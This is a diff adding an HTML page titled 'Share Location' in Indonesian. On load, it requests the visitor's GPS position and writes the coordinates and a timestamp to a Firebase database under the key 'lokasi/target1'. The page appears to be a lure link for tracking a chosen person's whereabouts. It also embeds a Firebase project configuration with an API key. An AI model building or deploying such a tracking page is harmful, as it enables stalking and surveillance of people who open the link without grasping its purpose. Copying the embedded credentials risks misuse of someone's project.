@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>Bagikan Lokasi</title>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+</head>
+<body style="text-align:center;font-family:sans-serif;margin-top:60px;">
+  <h2>Mengirim Lokasi ke Server...</h2>
+  <p id="status">Menunggu izin GPS...</p>
+
+  <script>
+    // Ganti dengan config project Firebase kamu
+    const firebaseConfig = {
+      apiKey: "AIzaSyD34rQ2TASBUeWR5Q2D563nFVy2AUWFNq4",
+      authDomain: "third-summer-457820.firebaseapp.com",
+      databaseURL: "https://third-summer-457820-default-rtdb.firebaseio.com",
+      projectId: "third-summer-457820",
+      storageBucket: "third-summer-457820.appspot.com",
+      messagingSenderId: "147925945177",
+      appId: "1:147925945177:web:xxx"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function kirimLokasi(lat, lon) {
+      const lokasi = {
+        latitude: lat,
+        longitude: lon,
+        waktu: new Date().toISOString()
+      };
+      db.ref("lokasi/target1").set(lokasi);
+      document.getElementById("status").innerText = "Lokasi berhasil dikirim.";
+    }
+
+    function lacak() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          kirimLokasi(pos.coords.latitude, pos.coords.longitude);
+        }, () => {
+          document.getElementById("status").innerText = "Gagal ambil lokasi.";
+        });
+      } else {
+        document.getElementById("status").innerText = "Browser tidak mendukung GPS.";
+      }
+    }
+
+    window.onload = lacak;
+  </script>
+</body>
+</html>
